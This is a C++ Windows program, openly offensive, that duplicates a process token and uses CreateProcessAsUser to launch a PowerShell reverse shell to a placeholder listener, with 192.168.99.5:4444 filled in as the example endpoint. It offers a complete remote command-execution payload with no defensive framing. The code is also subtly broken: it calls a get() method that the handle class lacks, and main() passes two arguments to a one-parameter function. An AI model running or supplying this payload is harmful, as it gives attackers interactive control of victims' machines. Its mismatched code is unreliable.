#include <windows.h>
#include <stdio.h>
#include <comutil.h>
#include <comdef.h>
#include <string>
#include <iostream>
#include <sstream>
#include <iomanip>
#include <fstream>

#include <objbase.h>
#include <objidl.h>
#include <comdef.h>
#include <unknwn.h>

using namespace std;

class ScopedHandle
{
public:
    ScopedHandle() : handle_(nullptr) {}
    ~ScopedHandle()
    {
        if (handle_ != nullptr && handle_ != INVALID_HANDLE_VALUE)
        {
            CloseHandle(handle_);
        }
    }
    HANDLE *ptr() { return &handle_; }

private:
    HANDLE handle_;
};

void CreateNewProcess(const wchar_t* session)
{
    // Your reverse shell payload
    wchar_t reverse_shell_payload[] = L"cmd.exe /c powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP', YOUR_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();\"";

    DWORD session_id = wcstoul(session, nullptr, 0);
    ScopedHandle token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, token.ptr()))
    {
        throw _com_error(E_FAIL);
    }

    ScopedHandle new_token;

    if (!DuplicateTokenEx(token.get(), TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, new_token.ptr()))
    {
        throw _com_error(E_FAIL);
    }

    SetTokenInformation(new_token.get(), TokenSessionId, &session_id, sizeof(session_id));

    STARTUPINFO start_info = {};
    start_info.cb = sizeof(start_info);
    start_info.lpDesktop = L"WinSta0\\Default";
    PROCESS_INFORMATION proc_info;
    if (CreateProcessAsUser(new_token.get(), nullptr, reverse_shell_payload,
        nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &start_info, &proc_info))
    {
        CloseHandle(proc_info.hProcess);
        CloseHandle(proc_info.hThread);
    }
}

int main()
{
    // Replace 'YOUR_IP' and 'YOUR_PORT' with your IP address and listening port respectively.
    // Example: CreateNewProcess(L"192.168.99.5", L"4444");
    CreateNewProcess(L"192.168.99.5", L"4444");
    return 0;
}

